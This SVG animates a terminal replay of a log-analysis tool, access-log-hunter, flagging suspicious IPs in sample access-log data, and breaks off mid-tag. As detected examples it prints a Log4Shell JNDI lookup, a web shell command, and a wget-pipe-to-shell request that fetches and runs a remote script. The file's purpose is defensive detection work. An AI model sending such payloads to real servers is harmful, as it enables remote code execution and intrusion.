<svg xmlns="http://www.w3.org/2000/svg" width="860" height="484" viewBox="0 0 860 484" role="img" aria-label="Terminal replay of access-log-hunter on its sample data"><style>text{font:14px ui-monospace,Menlo,Consolas,monospace;fill:#d6deeb}.p{fill:#7fdbca}.c{fill:#ecc48d}.h{fill:#ff6b6b}.m{fill:#f78c6c}.l{fill:#82aaff}.i{fill:#8a96a8}@keyframes t{from{opacity:0}to{opacity:1}}.r{animation:t .01s backwards}.d0{animation-delay:0.40s}.d1{animation-delay:0.75s}.d2{animation-delay:1.10s}.d3{animation-delay:1.45s}.d4{animation-delay:1.80s}.d5{animation-delay:2.15s}.d6{animation-delay:2.50s}.d7{animation-delay:2.85s}.d8{animation-delay:3.20s}.d9{animation-delay:3.55s}.d10{animation-delay:3.90s}.d11{animation-delay:4.25s}.d12{animation-delay:4.60s}.d13{animation-delay:4.95s}.d14{animation-delay:5.30s}.d15{animation-delay:5.65s}</style><rect width="860" height="484" rx="10" fill="#011627"/><rect width="860" height="34" rx="10" fill="#0b2942"/><circle cx="20" cy="17" r="6" fill="#ff5f56"/><circle cx="40" cy="17" r="6" fill="#ffbd2e"/><circle cx="60" cy="17" r="6" fill="#27c93f"/><text x="430" y="22" text-anchor="middle" class="i">access-log-hunter</text><text x="20" y="64" xml:space="preserve"><tspan class="p">$ </tspan>lua5.4 bin/access-log-hunter examples/access.log</text><text class="r d0 " x="20" y="108" xml:space="preserve">172 requests, 51 suspicious, 5 offending IPs</text><text class="r d1 h" x="20" y="130" xml:space="preserve">CRITICAL 192.0.2.77      score 20  4 requests, 4 errors  [rce]</text><text class="r d2 " x="20" y="152" xml:space="preserve">         GET /?x=${jndi:ldap://203.0.113.200/a}</text><text class="r d3 " x="20" y="174" xml:space="preserve">         GET /shell.php?cmd=id</text><text class="r d4 " x="20" y="196" xml:space="preserve">         GET /upload/x.php?cmd=wget%20http://203.0.113.200/m.sh%20|%20sh</text><text class="r d5 h" x="20" y="218" xml:space="preserve">HIGH     203.0.113.9     score 25  5 requests, 5 errors  [scanner, sqli]</text><text cla